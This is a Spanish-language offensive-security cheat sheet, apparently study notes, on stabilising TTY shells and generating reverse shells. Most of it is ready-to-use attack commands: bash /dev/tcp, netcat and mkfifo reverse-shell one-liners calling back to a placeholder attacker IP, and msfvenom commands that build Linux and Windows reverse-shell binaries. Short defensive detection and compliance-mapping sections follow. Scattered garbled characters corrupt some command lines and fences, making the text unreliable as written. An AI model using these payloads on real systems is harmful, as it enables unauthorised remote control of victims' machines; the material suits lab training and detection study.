# 03.1 Gestión Avanzada de Shells, Payloads y Explotación

## 1. CheatSheet & Comandos de Explotación Directa

##  Tratamiento de TTY (Estabilización Completa de Shell)
```bash
# Paso 1: Spawn de PTY con Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Paso 2: Suspender la shell con Ctrl+Z y configurar terminal local
stty raw -echo ; fg

# Paso 3: Ajustar variables de entorno y dimensiones
export TERM=xterm-256color
stty rows 38 columns 116
```J
## Payloads de Reverse Shell
``gbash
# Bash TCP
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1

# Netcat con -e
nc -e /bin/bash 10.10.14.X 4444

# Netcat mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f||/bin/sh -i 2>&1|nc 10.10.14.X 4444 >/tmp/f
```

## Generación de Payloads con msfvenom
``gbash
# Linux ELF Reverse Shell
msfvenom -p linux/x64/shell_reverse_tcp LA�ST=10.10.14.X LPORT=4444 -f elf -o shell.elf

# Windows EXE Reverse Shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f exe -o shell.exe
```J

## 2. Deep Dive Técnico: Sockets, TTY y Descriptores de Archivo
- **Descriptores Estándar:** `0` (STDIN), `1` (STDOUT), `2` (STDERR).
- La redirecció> `>& /dev/tcp/IP/PORT` canaliza STDOUT y STDERR a un socket TCP creado dinâmicamente por la shell.

## 3. Perspectiva Defensiva (Blue Team)
- **Monitoreo:** Detección de procesos hijo anómalos spawneados por servidores web (`www-data` lanzando `/bin/sh` o `powershell.exe`).
- **Reglas Sigma / Sysmon:** Event ID 1 (Process Creation) filtrando comandos con redireciones a `/dev/tcp/` o llamadas a `mkfifo`.

## 4. Mapeo GRC & Marcos Normativos
- **ISO 27001:2022:** Control A.8.7 (Protección contra Malware) y A.8.9 (Gestión de Configuración).
- **NIST CSF 2.0:** PR.PS-01 (Protección de Plataformas y Servicios) y DE.CM-01 (Monitoreoc Continuo).
